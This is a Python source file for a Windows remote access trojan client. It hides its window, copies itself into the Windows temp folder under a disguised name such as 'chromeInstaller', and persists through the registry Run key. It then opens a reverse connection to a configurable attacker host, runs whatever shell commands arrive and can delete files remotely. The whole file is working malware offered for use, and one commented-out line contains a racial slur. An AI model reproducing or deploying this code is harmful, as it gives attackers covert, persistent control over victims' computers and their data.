import socket
import subprocess
import time
import os
import ctypes
import sys
from threading import Thread
import win32gui, win32con
import shutil
import random
import platform
import winreg as reg
import requests


############# ---------------------------------- Change Veriables Bellow ---------------------------------- #############


# Hosting

hostServer = '192.1.1.1' # change this to host ip or dns. ( local ipv4 for example)
hostPort = 1337  # change this to da port on ur pc to connect on. Make sure its the same one as on your server!


# Persistnace

makeHidden = True #RECOMENDED! Or else client will just close window xD
install = True
install_folder = "C:\\Windows\\TEMP"  # change this to ur installation folder
install_name = "chromeInstaller" # make this look legit idk give it a not sus name
Startup = True



#### ------------------------------------------------------------------------------------------------------------------------------------------------ ####
#### ------------------------------------------------------------------------------------------------------------------------------------------------ ####
#### ------------------------------------------------------------------------------------------------------------------------------------------------ ####
#### ------------------------------------------------------------------------------------------------------------------------------------------------ ####
#### ------------------------------------------------------------------------------------------------------------------------------------------------ ####
#### ------------------------------------------------------------------------------------------------------------------------------------------------ ####

#### -------------------------------- You dont need to touch anything after this point exept if ur skar (pro coder ;) ------------------------------- ####

randomNum = random.random()
if install:
    # gen random number to add to the rat so its never twice the same cus im lazy to inplement cheak function :skull:
    random_num = random.random()
    
    # get the current dir name
    script_dir = os.path.dirname(os.path.abspath(__file__))
    script_name = os.path.basename(__file__)

    if script_dir != install_folder:
        new_script_name = f"{install_name}_{random_num}.py"

        new_script_path = os.path.join(install_folder, new_script_name)

        try:
            shutil.copy(__file__, new_script_path)
            print(f" [ @ ] Install To: {install_folder}")

            # run that bad boy
            subprocess.Popen(f'start cmd /k python "{new_script_path}"', shell=True)

            # exit the current instance
            sys.exit(0)
        except Exception as e:
            print(f"Failed to copy or run script: {e}")



#add to reg
if Startup:
    try:
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        app_name = install_name  
        app_path = os.path.abspath(__file__)

        # open registry key
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)

        # Set the reg value 
        reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)

        # close it
        reg.CloseKey(reg_key)

        print(f" [ * ] {app_name} has been added to startup.")
    except Exception as e:
        print(f" [ ! ] Failed to add to startup: {e}")


# make hidden
if makeHidden == True:
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide , win32con.SW_HIDE)




class Client:
    

    def __init__(self, hostServer, hostPort):
        self.hostServer = hostServer
        self.hostPort = hostPort
        self.s = None

    def connect(self):
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.hostServer, self.hostPort))
                print(f" [ $ ] Connected to {self.hostServer}:{self.hostPort}")
                return True
            except Exception as e:
                print(f" [ ! ] Connection failed: {e}")
                time.sleep(3)  # wait a bit before retrying

    def run(self):
        while True:
            try:
                command = self.s.recv(1024).decode()
                if not command:
                    print(" [ ! ] Connection closed by remote host. Reconnecting...")
                    self.s.close()
                    if not self.connect():
                        break

                if command.lower() == 'ping': #ping pong shit lol
                    pong = b"\n [ < ] Pong!\n"
                    self.s.send(pong)
                    continue

                elif command.lower().startswith('skar goto '):
                    path = command[11:].strip()  # Extract the path 
                    try:
                        os.chdir(path)
                        print(" [ + ] changed path to", os.getcwd(), "\n\n")
                        changedPathOk = b"\n [ / ] Changed Path"
                        self.s.send(changedPathOk)
                    except FileNotFoundError:
                        print(" [ - ] Directory not found\n\n")
                        dirNotFound = b"\n [ ! ] Directory not found"
                        self.s.send(dirNotFound)
                    except Exception as e:
                        print(" [ - ] An error occurred while changing the directory:", str(e), "\n\n")
                        dirChangeError = b"\n [ ! ] Directory change error: " + str(e).encode()
                        self.s.send(dirChangeError)
                    continue

                elif command.lower().startswith('skar del '):
                    fileToDelete = command[9:].strip()  # Extract the file
                    try:
                        os.remove(fileToDelete)
                        print(f" [ x ] File {fileToDelete} got delted. BOOM! \n\n")
                        fileDeletedOk = b"\n [ x ] File" + fileToDelete, "got delted. BOOM!"
                        self.s.send(fileDeletedOk.encode())
                    except FileNotFoundError:
                        print(f" [ - ] Cant seem to find {fileToDelete} \n\n")
                        fileNotFound = b"\n [ - ] Can't seem to find the file."
                        self.s.send(fileNotFound)
                    except Exception as e:
                        print(" [ - ] An error occurred while deleting the file :", str(e), "\n\n")
                        deleteError  = b"\n [ ! ] Erorr deleting file: " + str(e).encode()
                        self.s.send(deleteError)
                    continue



                #if command.lower() == ' ': # if they r bozos and type space + enter:
               #     niggaEnterSmt = b"\n [ ! ] Enter something!\n"
                #    self.s.send(niggaEnterSmt)
               #     continue

                print(f" [ $ ] {self.hostServer}:{self.hostPort}:~# {command}")

                #sendingCmd = b"\n [ # ] Sending Command To Host...\n" usless tbh lol
                #self.s.send(sendingCmd)

                result = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,  
                    )
                output, error = result.communicate()

                if not output:
                    response = b" [ - ] Command executed without output.\n" # show this if there aint no output 
                elif command is None:
                    response = b" [ - ] No input"
                else:
                    response = output

                self.s.send(response)

            except ConnectionResetError:
                print(" [ ! ] Connection closed by remote host. Reconnecting...")
                self.s.close()
                if not self.connect():
                    break

def main():
    

    while True:
        client = Client(hostServer, hostPort)
        if client.connect():
            client.run()

if __name__ == "__main__":
    main()
